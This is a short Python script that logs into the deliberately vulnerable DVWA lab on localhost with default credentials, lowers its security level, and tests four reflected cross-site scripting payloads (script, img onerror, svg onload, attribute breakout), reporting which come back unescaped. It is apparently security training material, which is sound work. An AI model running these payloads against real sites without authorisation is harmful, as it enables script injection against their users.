import requests
import re

BASE_URL = "http://localhost"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"
XSS_URL = f"{BASE_URL}/vulnerabilities/xss_r/"  # Reflected XSS page

# XSS payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'><script>alert(1)</script>"
]

def get_token(session, url):
    page = session.get(url)
    token = re.search(r"user_token' value='(.*?)'", page.text)
    return token.group(1) if token else ""

def login(session):
    token_value = get_token(session, LOGIN_URL)
    payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token_value
    }
    session.post(LOGIN_URL, data=payload)
    print("[+] Logged in to DVWA")

def set_security_level(session, level="low"):
    token_value = get_token(session, SECURITY_URL)
    payload = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token_value
    }
    session.post(SECURITY_URL, data=payload)
    print(f"[+] Security level set to '{level}'")

def test_xss(session):
    print("\n[*] Starting Reflected XSS Scan...\n")

    for payload in payloads:
        params = {"name": payload}
        response = session.get(XSS_URL, params=params)

        # Vulnerable if our exact payload appears unescaped in the response
        vulnerable = payload in response.text

        status = "\U0001F534 VULNERABLE" if vulnerable else "\U0001F7E2 Not detected"
        print(f"Payload: {payload:40} --> {status}")

if __name__ == "__main__":
    session = requests.Session()
    login(session)
    set_security_level(session, "low")
    test_xss(session)